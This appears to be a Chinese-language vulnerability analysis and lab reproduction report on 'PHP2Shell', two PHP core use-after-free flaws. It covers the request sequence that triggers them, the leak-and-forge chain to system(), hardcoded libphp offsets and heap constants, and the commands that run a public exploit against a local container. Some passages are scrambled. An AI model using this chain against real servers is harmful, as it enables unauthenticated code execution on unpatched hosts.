#  全网都在等的PHP2Shell 远程命令执行漏洞复现，漏洞通用，POC不通用！ ！ ！  
原创 网络安全透视镜
                    网络安全透视镜  网络安全透视镜   2026-10-21 16:27  
  
"  
  
漏洞通用  
，  
RCE 载荷不通用  
——没有一个 HTTP 包能打所有未修复的 PHP。  
  
—— PHP2Shell 漏洞分析报告  
  
PHP2Shell 是 2026-10-21 紧急披露的两个 PHP   
内核远程代码执行漏洞，CVSS v4.0 均为   
9.2，不需要任何凭据。本报告在 PHP 8.4.26 + Apache prefork 单 worker 上已真实打出代码执行，并给出了一条可以直接给审阅者用的判断结论。  
  
本文看点  
  
01  
  
两个 CVE 同源，一口一个 bug  
  
02  
  
为什么没有通用 PoC  
  
03  
  
真实打出 uid=33 的完整链路  
  
CVE-2026-109618 / CVE-2026-109619  
  
文档性质  
  
实验室漏洞分析与定点复现记录  
  
编写日期  
  
2026-10-22  
  
分析对象  
  
php-src 内核（session + multipart + Zend MM）  
  
本地结论  
  
补丁存在；在   
PHP 8.4.26 NTS + Apache 2.4.68 prefork 单 worker 上   
已打出 RCE（  
uid=33(www-data)）  
  
关键结论  
  
漏洞通用，RCE exploit 不通用。 不存在「一个 HTTP 包打所有未修复 PHP」的 PoC。  
  
01  
CHAPTER  
### 漏洞概述  
  
  
PHP2Shell 是 2026-10-21 紧急披露的两个 PHP 内核远程代码执行漏洞，CVSS v4.0 均为   
9.2（  
AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H）。CWE 以   
CWE-416 Use After Free 为主，并涉及异常路径处理（CWE-755）、未初始化指针（CWE-824）。  
  
两个 CVE 是同一类「bailout 后状态损坏」问题的两面：  
  
CVE-2026-109618 — OOM 时 `longjmp` 撕开半初始化状态  
  
PHP 用   
memory_limit 限制单请求内存。触顶时走：  
  
zend_mm_safe_error()  
  
→ zend_error_noreturn(E_ERROR, "Allowed memory size of %zu bytes exhausted...")  
  
→ zend_bailout() // 实质是 longjmp  
  
longjmp 从  
任意 C 栈帧直接跳回请求顶层，中间所有尚未跑完的构造函数、链表挂接、全局赋值都被跳过。若此时请求内存（executor globals、session 模块全局、multipart 解析器）只初始化了一半，随后   
php_request_shutdown() 仍按「这是一次完整请求」去遍历、释放这些指针。  
  
官方说明最高危 SAPI 是   
Apache   
mod_php：startup 失败也照样 shutdown，且发生在任何应用代码之前。  
  
补丁前关键代码（php-8.4.26   
Zend/zend_alloc.c）：  
  
.  
.  
.  
c  
  
static ZEND_COLD ZEND_NORETURN void zend_mm_safe_error(...)  
  
{  
  
heap->overflow = 1;  
  
zend_try {  
  
zend_error_noreturn(E_ERROR, format, limit, size);  
  
} zend_catch {  
  
} zend_end_try();  
  
heap->overflow = 0;  
  
zend_bailout(); /* ← 漏洞核心 */  
  
exit(1);  
  
}  
  
CVE-2026-109619 — 跨请求残留的进程级全局  
  
php-fpm / mod_php worker 是  
长驻进程。一次请求可以把「属于本请求堆」的对象挂到进程全局：  
  
、（session 模块）  
  
PS(id)  
  
PS(http_session_vars)  
  
错误对象 / 8.5 的 fatal backtrace  
  
扩展残留  
  
请求以 OOM/  
longjmp/fatal 结束时如果没把这些全局清成   
UNDEF/  
NULL，  
下一个 HTTP 请求会把悬空指针当活对象：  
zval_ptr_dtor(PS(http_session_vars)) → UAF。  
  
已确认、且  
不需要应用配合的生产者/消费者：  
  
session.upload_progress  
（PHP 5.4 起默认 On）。 multipart 解析回调运行在   
RINIT 之前：  
  
FILE_START → php_session_rfc1867_update() → php_session_initialize()  
  
END → php_session_rfc1867_cleanup() → php_session_initialize()  
  
→ php_session_track_init()  
  
→ zval_ptr_dtor(PS(http_session_vars)) // 消费上一请求残留  
  
目标页面可以是   
<?php echo "OK"; ?>，  
不必调用   
session_start()。  
  
两者如何拼成 RCE  
  
请求 A（producer）  
  
multipart 带 PHP_SESSION_UPLOAD_PROGRESS  
  
→ 在 php_session_initialize() 内 OOM  
  
→ longjmp，PS(http_session_vars)/PS(id) 未清空  
  
  
请求 B（consumer，必须打到同一个 worker）  
  
再次走 upload_progress  
  
→ zval_ptr_dtor(悬空指针)  
  
→ 用 multipart 字段的 zend_string 重占刚释放的块  
  
→ 伪造 HashTable.pDestructor = zif_system  
  
→ system("id>/out/p1")  
  
流量全是普通   
multipart/form-data POST，没有自定义协议，也没有「把 PHP 源码 POST 上去就会执行」这种错误模型。  
  
  
02  
CHAPTER  
### 影响范围  
  
  
<table><thead><tr><th style="background: rgb(220, 38, 38);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 10px;text-align: left;font-size: 13px;"><section><span leaf="">分支</span></section></th><th style="background: rgb(220, 38, 38);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 10px;text-align: left;font-size: 13px;"><section><span leaf="">受影响</span></section></th><th style="background: rgb(220, 38, 38);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 10px;text-align: left;font-size: 13px;"><section><span leaf="">官方修复包</span></section></th></tr></thead><tbody><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">8.5</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">&lt;； 8.5.12</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf=""><span textstyle="" style="font-weight: bold;">8.5.12</span></span></section></td></tr><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">8.4</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">&lt;； 8.4.27</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf=""><span textstyle="" style="font-weight: bold;">8.4.27</span></span></section></td></tr><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">8.3</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">&lt;； 8.3.36</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf=""><span textstyle="" style="font-weight: bold;">8.3.36</span></span></section></td></tr><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">8.2</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">&lt;； 8.2.35</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf=""><span textstyle="" style="font-weight: bold;">8.2.35</span></span></section></td></tr><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">8.1 / 8.0 / 7.x / 5.4+</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">受影响（upload_progress 自 5.4 默认开启）</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf=""><span textstyle="" style="font-weight: bold;">无官方发行版</span>，仅有源码 backport</span></section></td></tr></tbody></table>  
  
SAPI：  
  
**mod_php + Apache prefork**：官方确认未认证 RCE，本实验室已复现。  
  
**PHP-FPM**：源码面可利用（session 路径）；官方未给出完整 FPM exploit。FPM 在 startup 失败时会杀掉 child，618 的「startup 失败仍 shutdown」这条在 FPM 上不成立，619 仍可能。  
  
FrankenPHP / LSAPI：模型类似。  
  
应用层（WordPress、Laravel、Drupal 等）只要解释器未打补丁即在范围内，与业务代码是否使用 session   
无关。  
  
  
03  
CHAPTER  
### 利用条件  
  
  
分两层看：  
触发 UAF 的条件相对宽；  
把 UAF 打成稳定 RCE 的条件极窄。  
  
触发层（相对通用）  
  
1  
PHP 未升级到上述修复版本。  
  
2  
session.upload_progress.enabled=On（默认；必须在   
php.ini /   
php_admin_value 关，  
ini_set() 来不及）。  
  
3  
memory_limit 为有限值（默认 128M 也可，实验室为了稳定打 OOM 收到 8M）。  
  
4  
post_max_size 大于用于打 OOM 的字段（否则进不了 rfc1867）。  
  
5  
攻击者可对任意   
.php 发 HTTP POST。  
  
6  
两次请求打到同一个 worker（prefork 单 worker 时为 100%；多 worker 只是降概率）。  
  
满足以上即可观察到：  
  
  
Fatal error: Allowed memory size ... exhausted in Unknown on line 0  
  
下一请求 session 状态异常（非法 PHPSESSID、读 session 失败）  
  
或 / worker  
  
zend_mm_heap corrupted  
  
SIGABRT  
  
这已经证明漏洞存在，但还不是 RCE。  
  
RCE 层（本实验室打通时的全部约束）  
  
<table><thead><tr><th style="background: rgb(220, 38, 38);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 10px;text-align: left;font-size: 13px;"><section><span leaf="">条件</span></section></th><th style="background: rgb(220, 38, 38);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 10px;text-align: left;font-size: 13px;"><section><span leaf="">本实验室取值</span></section></th><th style="background: rgb(220, 38, 38);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 10px;text-align: left;font-size: 13px;"><section><span leaf="">若不满足</span></section></th></tr></thead><tbody><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">精确构建</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf=""><span textstyle="" style="font-size: 14px;background-color: rgb(241, 245, 249);color: rgb(220, 38, 38);">php:8.4.26-apache-bookworm</span></span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">堆喷尺寸全部作废</span></section></td></tr><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">SAPI</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">mod_php + mpm_prefork</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">FPM 要另写一条链</span></section></td></tr><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">Worker 数</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf=""><span textstyle="" style="font-weight: bold;">1</span></span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">无法稳定 A→B 同进程</span></section></td></tr><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf=""><span textstyle="" style="font-size: 14px;background-color: rgb(241, 245, 249);color: rgb(220, 38, 38);">display_errors</span></span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf=""><span textstyle="" style="font-weight: bold;">On</span></span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">当前公开链的 Set-Cookie 泄漏依赖 <span textstyle="" style="font-size: 14px;background-color: rgb(241, 245, 249);color: rgb(220, 38, 38);">headers_sent</span></span></section></td></tr><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf=""><span textstyle="" style="font-size: 14px;background-color: rgb(241, 245, 249);color: rgb(220, 38, 38);">max_input_vars</span></span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">1000（默认）</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">超限 warning 的时机变了</span></section></td></tr><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf=""><span textstyle="" style="font-size: 14px;background-color: rgb(241, 245, 249);color: rgb(220, 38, 38);">memory_limit</span></span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">8M</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">OOM 点漂移，对象落点变</span></section></td></tr><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf=""><span textstyle="" style="font-size: 14px;background-color: rgb(241, 245, 249);color: rgb(220, 38, 38);">session.use_strict_mode</span></span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">Off</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf=""><span textstyle="" style="font-size: 14px;background-color: rgb(241, 245, 249);color: rgb(220, 38, 38);">\x00</span> PHPSESSID 无法迫使换 id</span></section></td></tr><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf=""><span textstyle="" style="font-size: 14px;background-color: rgb(241, 245, 249);color: rgb(220, 38, 38);">libphp.so</span> 偏移</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf=""><span textstyle="" style="font-size: 14px;background-color: rgb(241, 245, 249);color: rgb(220, 38, 38);">zif_system=0x45a3b0</span> 等</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">stage3 调到错误函数</span></section></td></tr><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">堆常数</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">HTDATA=<span textstyle="" style="font-size: 14px;background-color: rgb(241, 245, 249);color: rgb(220, 38, 38);">+0x690d8</span>，filler=841…</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">重占失败，只会崩</span></section></td></tr><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">用户态指针区间</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">本机内核映射在 <span textstyle="" style="font-size: 14px;background-color: rgb(241, 245, 249);color: rgb(220, 38, 38);">0x79…</span></span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">泄漏解析器会当「没漏到」</span></section></td></tr></tbody></table>  
  
命令嵌入 167 字节 zend_string，有效命令   
≤ 14 字节。  
  
  
04  
CHAPTER  
### 为什么该漏洞没有通用 PoC  
  
  
这是本报告要单独说清楚的一点：  
CVE 编号是通用的，RCE 载荷不是。  
  
「通用 PoC」在这里如果指「任意未打补丁 PHP，发固定 HTTP 包就能   
system()」，则  
不存在。原因不是信息披露不全，而是利用原语本身决定的。  
  
这是堆 UAF，不是「参数进了 `system()`」  
  
对比典型 PHP 应用 RCE（反序列化 gadget、文件上传、  
eval($_GET)）：  
  
<table><thead><tr><th style="background: rgb(220, 38, 38);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 10px;text-align: left;font-size: 13px;"><section><span leaf=""><br/></span></section></th><th style="background: rgb(220, 38, 38);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 10px;text-align: left;font-size: 13px;"><section><span leaf="">应用层 RCE</span></section></th><th style="background: rgb(220, 38, 38);color: rgb(255, 255, 255);font-weight: 700;padding: 8px 10px;text-align: left;font-size: 13px;"><section><span leaf="">PHP2Shell RCE</span></section></th></tr></thead><tbody><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">稳定原语</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">字符串/对象图，语义确定</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">悬空指针 + 堆块尺寸</span></section></td></tr><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">载荷</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">逻辑 payload，跨版本常还能用</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">fake HashTable 二进制，对 Zend MM bin 敏感</span></section></td></tr><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">ASLR</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">通常不需要</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">必须先泄 chunk 基址和 libphp 基址</span></section></td></tr><tr><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">目标代码</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf="">某条业务逻辑</span></section></td><td style="padding: 8px 10px;border-bottom: 1px solid rgb(254, 226, 226);color: rgb(55, 65, 81);background: rgb(254, 242, 242);font-size: 13px;line-height: 1.65;vertical-align: top;"><section><span leaf=""><span textstyle="" style="font-size: 14px;background-color: rgb(241, 245, 249);color: rgb(220, 38, 38);">libphp.so</span> 里 <span textstyle="" style="font-size: 14px;background-color: rgb(241, 245, 249);color: rgb(220, 38, 38);">zif_system</span> 的<span textstyle="" style="font-weight: bold;">文件偏移</span></span></section></td></tr></tbody></table>  
  
UAF 能转 RCE 的前提是：攻击者知道「释放块的尺寸、下一次分配会落到哪、伪造对象里每个字段的偏移」。这些对   
PHP 小版本、编译选项、发行版、Apache/PHP 谁先分配堆 全部敏感。  
  
本机对照实验：同一条公开 exp，换一层构建就失败  
  
实验室用的是同一套 [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp) 源码：  
  
1  
  
Hub 默认   
php:8.4.26-apache（  
Debian 13 Trixie，Apache 2.4.69）  
  
stage1   
HEAP_LEAK_FAILED（5/5）  
  
2  
  
php:8.4.26-apache-bookworm（Debian 12，Apache 2.4.68）  
  
cookie 已泄漏，但脚本只认   
0x7f… 指针，仍判失败  
  
3  
  
同上，只把指针窗口放到   
0x55…–0x80…（本机内核 6.8 堆在   
0x79…）  
  
第一次即 RCE  
  
注意：1 和 2 的 PHP   
都是 8.4.26。只换了 Debian 小版本 / Apache 小版本，  
libphp.so 里：  
  
Trixie: zif_system=0x465370 zval_ptr_dtor=0x65eb60  
  
Bookworm: zif_system=0x45a3b0 zval_ptr_dtor=0x64eb60  
  
堆喷个数（841 / 406 /   
+0x690d8）是按 bookworm 镜像标定的，拿到 Trixie 上全部对不齐。   
同一 PHP 版本号都做不到通用，更不可能覆盖 5.4～8.5。  
  
必须按目标现场 leak 的量  
  
完整链至少要在  
这个 worker 的这次地址空间里得到：  
  
1  
Zend MM chunk 基址（2MiB 对齐）。来源：伪造超长   
zend_string，让   
php_url_encode(PS(id)) 越界读，从   
Set-Cookie: PHPSESSID= 里捞指针。本机一次泄漏 4096 字节 cookie、98 次命中   
0x79cdb5400000。  
  
2  
libphp.so  
 基址。来源：把   
pDestructor 读成   
zval_ptr_dtor，减去该构建的文件偏移。  
  
3  
若干相对 chunk 的常量（HTDATA、R0、pad 尺寸）。这些  
不能从泄漏里直接算出来，只能对「这一个 ELF + 这一套 INI」预先标定。  
  
少任何一项，stage3 的 fake HashTable 就会指到随机内存：表现是 worker 崩溃（看起来像 DoS），而不是   
system()。  
  
这也是为什么分析过程必须看堆、看偏移——不是「研究怎么打得更花」，而是   
RCE 载荷把布局写死了。  
  
SAPI / INI / MPM 会改掉对象生命周期  
  
即使二进制相同：  
  
**多 worker**：A 的悬空指针在 worker-3，B 打到 worker-7，消费的是干净状态。只能靠大量请求碰概率，不能当稳定 PoC。  
  
**FPM**：startup 失败直接 child，618 的「半初始化 shutdown」路径被剪掉；419 的 session 路径还在，但堆与 Apache prefork 完全不同，bookworm 常数作废。  
  
_exit  
  
****：当前链靠 超限 warning 置 ，才能在 OOM 之后仍通过 把堆指针带出来。关掉就没了这条泄漏。公开仓库自己也写了「 的完整 RCE 稍后提交」。  
  
display_errors=Off  
  
max_input_vars  
  
headers_sent=1  
  
Set-Cookie  
  
display_errors=0  
  
** 不是 8M**：OOM 发生的分配点变了，session 对象和后续 zend_string 落在不同 bin。  
  
memory_limit  
  
****： 无法迫使 ，泄漏阶段缺 cookie。  
  
session.use_strict_mode=On  
  
PHPSESSID=\x00  
  
send_cookie=1  
  
这些都是  
默认或常见生产配置，所以「默认 PHP」四个字并不能推出「默认能 RCE」。  
  
能通用的只有「验洞触发包」，不是 RCE  
  
可以相对通用的是   
A+B 两包（见第 6.3 节）：  
  
任意未修复 PHP + 默认 upload_progress + 有限  
  
memory_limit  
  
效果：OOM fatal、跨请求 session 异常、可能打崩 worker  
  
**效果不是命令执行**  
  
把「能打崩 / 能脏状态」写成「通用 RCE PoC」是错误的。本仓库因此拆成两份：  
  
：通用触发（无命令执行）  
  
lab/trigger_upload_progress_oom.py  
  
：**仅** 的 RCE  
  
lab/php-8.4.26-apache-bookworm/exp.py  
  
php:8.4.26-apache-bookworm  
  
小结  
  
「PHP2Shell 的漏洞面是内核级、默认配置即可触发的 UAF；把它变成稳定 RCE 需要「同 worker + 预先标定的堆喷尺寸 + 该次构建的 libphp.so 符号偏移 + 一次成功的 Cookie 泄漏」。 因此：不存在跨版本、跨发行版、跨 SAPI 的通用 RCE PoC；只存在「某一精确构建上的定点 exploit」和「跨版本的崩溃/状态损坏触发包」。」  
  
  
05  
CHAPTER  
### 定点复现环境  
  
  
以下环境已两次独立打出   
uid=33(www-data)。  
  
宿主机与靶场  
  
宿主机  
  
Ubuntu 24.04.4 LTS，内核 6.8.0，Docker 29.2.1  
  
镜像  
  
php:8.4.26-apache-bookworm  
  
Image ID  
  
sha256:df868eae5dacd34acf4722610c7275b43e4648d7710dd1c5e7dafd0b498d59d1  
  
容器 OS  
  
Debian GNU/Linux 12.15 (bookworm)  
  
PHP  
  
8.4.26 NTS，Zend Engine 4.4.26，mod_php  
  
Apache  
  
2.4.68，  
mpm_prefork，  
MaxRequestWorkers=1，KeepAlive Off  
  
libphp.so  
  
21172088 B，sha256   
ff3ea77fb119541f6d10ddf0fa7e9e3fd6a3043e049a536b530dbbec35db68d6  
  
监听  
  
127.0.0.1:8088  
  
目标页  
  
<?php echo "OK\n"; ?>（无   
session_start()）  
  
HTTP 指纹（exp 启动时会校验，不对则拒绝）：  
  
Server: Apache/2.4.68 (Debian)  
  
X-Powered-By: PHP/8.4.26  
  
PHP / Apache 配置  
  
php.ini：  
  
.  
.  
.  
ini  
  
display_errors = On  
  
display_startup_errors = On  
  
error_reporting = E_ALL  
  
memory_limit = 8M  
  
post_max_size = 64M  
  
upload_max_filesize = 64M  
  
max_input_vars = 1000  
  
session.save_path = "/tmp"  
  
session.use_strict_mode = 0  
  
session.use_cookies = 1  
  
session.upload_progress.enabled = On  
  
session.upload_progress.cleanup = On  
  
Apache MPM：  
  
.  
.  
.  
apache  
  
KeepAlive Off  
  
<IfModule mpm_prefork_module>  
  
StartServers 1  
  
MinSpareServers 1  
  
MaxSpareServers 1  
  
MaxRequestWorkers 1  
  
ServerLimit 1  
  
MaxConnectionsPerChild 0  
  
</IfModule>  
  
启动靶场  
  
官方   
php:8.4.26-apache 当前默认是   
Trixie，堆布局与本 exp 不一致。必须显式用 bookworm 标签：  
  
bash  
  
# 仓库内已有 docker-compose（9bie 靶场配置）  
  
cd /path/to/php2shell-bypass-aslr-exp  
  
  
docker pull php:8.4.26-apache-bookworm  
  
docker tag php:8.4.26-apache-bookworm php:8.4.26-apache  
  
  
docker compose -f docker/docker-compose.yml up -d  
  
  
curl -sI http://127.0.0.1:8088/index.php  
  
# Server: Apache/2.4.68 (Debian)  
  
# X-Powered-By: PHP/8.4.26  
  
curl -s http://127.0.0.1:8088/index.php  
  
# OK  
  
本实验室对应容器名：  
php2shell-target。  
./out 挂到容器   
/out，RCE 默认把   
id 写到   
/out/p1。  
  
  
06  
CHAPTER  
### 复现步骤  
  
  
一键 RCE（推荐，完整代码）  
  
完整利用代码（已按第 5 节构建写死偏移，启动时校验指纹）：  
  
/home/iot/opt/test/phprce/lab/php-8.4.26-apache-bookworm/exp.py  
  
bash  
  
python3 /home/iot/opt/test/phprce/lab/php-8.4.26-apache-bookworm/exp.py \  
  
-u http://127.0.0.1:8088/index.php  
  
本机两次运行均在 stage3 第 1 次尝试成功：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/m3tfzlbEQPrFDWxgiaq92okre7ksojH8iaYa6BdeA8dXF8TAQcNN63OG9edVxbdY59mk0SGgfbib7kVJZxbzVibbDVD1OhiaicWDQibJYlplKtRPQE/640?wx_fmt=png&from=appmsg "")  
  
  
[*] fingerprint Server='Apache/2.4.68 (Debian)' X-Powered-By='PHP/8.4.26'  
  
[*] hardcoded offsets: zif=0x45a3b0 dtor=0x64eb60 htdata=0x690d8  
  
